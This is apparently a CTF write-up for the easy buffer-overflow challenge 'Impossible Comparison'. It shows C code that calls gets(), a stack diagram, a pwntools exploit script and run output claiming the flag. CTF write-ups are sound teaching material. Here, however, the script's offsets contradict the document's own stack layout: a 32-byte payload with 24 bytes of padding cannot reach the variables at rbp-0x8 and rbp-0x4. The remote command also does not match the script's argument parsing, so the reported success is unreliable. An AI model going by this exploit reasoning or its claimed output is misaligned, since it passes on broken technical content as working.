---
title: Impossible Comparison
published: 2025-10-16
description: A detailed walkthrough of the Impossible Comparison CTF challenge.
image: ./impossible_comparison.png
tags: [CTF, Binary Exploitation, Buffer Overflow]
category: CTF Writeups
draft: false
series: CTF Writeups
---

# Impossible Comparison

**Challenge**: Impossible Comparison
**Category**: Binary Exploitation
**Difficulty**: Easy
**Flag**: `flag{buff3r_0v3rfl0w_m4k3s_1mp0ss1bl3_p0ss1bl3}`

## Analysis

The binary has a simple buffer overflow vulnerability. The `vulnerable()` function declares two integers `departmentA` and `departmentB` with initial values 1 and 2 respectively, but requires them to be equal to print the flag. Here's the vulnerable code:

```c
void vulnerable() {
    int departmentA = 1;
    int departmentB = 2;
    char buffer[0x20];

    // read flag
    FILE* flag_file;
    flag_file = fopen("./flag.txt", "r");
    if (flag_file == NULL) {
        puts("[-] Flag file not found.");
        return;
    }
    fgets(flag, sizeof(flag), flag_file);
    fclose(flag_file);

    // vulnerable input
    gets(buffer);

    // compare departments
    if (departmentA == departmentB) {
        printf("[+] Flag: %s", flag);
    } else {
        printf("[-] Departments are not equal. Department A: %d, Department B: %d\n", departmentA, departmentB);
    }
}
```

The vulnerability is in the `gets(buffer)` call, which doesn't check input length and allows overflowing the 32-byte buffer to overwrite the stack variables.

### Stack Layout

```
Stack Layout (higher addresses)
┌─────────────────────┐
│       saved rbp     │ ← rbp
├─────────────────────┤
│   departmentA (4B)  │ ← rbp-0x4  (stores value 1)
├─────────────────────┤
│   departmentB (4B)  │ ← rbp-0x8  (stores value 2)
├─────────────────────┤
│   flag_file* (8B)   │ ← rbp-0x10 (FILE pointer)
├─────────────────────┤
│                     │
│   buffer (32B)      │ ← rbp-0x30 (our input)
│   [0x20 bytes]      │
│                     │
└─────────────────────┘
Lower Addresses
```

## Solution

We need to overflow the buffer to overwrite both `departmentA` and `departmentB` with the same value.

### Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "REMOTE":
        host = sys.argv[2] if len(sys.argv) > 2 else "localhost"
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 1337
        conn = remote(host, port)
    else:
        conn = process('./chall')

    # Calculate offsets
    buffer_size = 0x20  # 32 bytes
    padding_to_departmentB = 0x20 - 0x8  # 24 bytes
    padding_to_departmentA = 0x20 - 0x4  # 28 bytes

    # Create payload
    # Fill buffer + overwrite departmentB and departmentA with same value
    payload = b"A" * padding_to_departmentB  # Fill up to departmentB
    payload += p32(1)  # Overwrite departmentB with 1
    payload += p32(1)  # Overwrite departmentA with 1

    print(f"[+] Sending payload of length: {len(payload)}")
    conn.sendline(payload)

    # Receive response
    try:
        response = conn.recvall(timeout=2).decode()
        print(f"[+] Response: {response}")
    except:
        response = conn.recv().decode()
        print(f"[+] Response: {response}")

    conn.close()

if __name__ == "__main__":
    main()
```

### Execution

```bash
# Local execution
$ python3 exploit.py
[+] Sending payload of length: 32
[+] Response: [+] Flag: flag{buff3r_0v3rfl0w_m4k3s_1mp0ss1bl3_p0ss1bl3}

# Remote execution
$ python3 exploit.py REMOTE HOST=example.com PORT=1337
[+] Sending payload of length: 32
[+] Response: [+] Flag: flag{buff3r_0v3rfl0w_m4k3s_1mp0ss1bl3_p0ss1bl3}
```

The exploit successfully overflows the buffer to make both department variables equal, bypassing the comparison and retrieving the flag.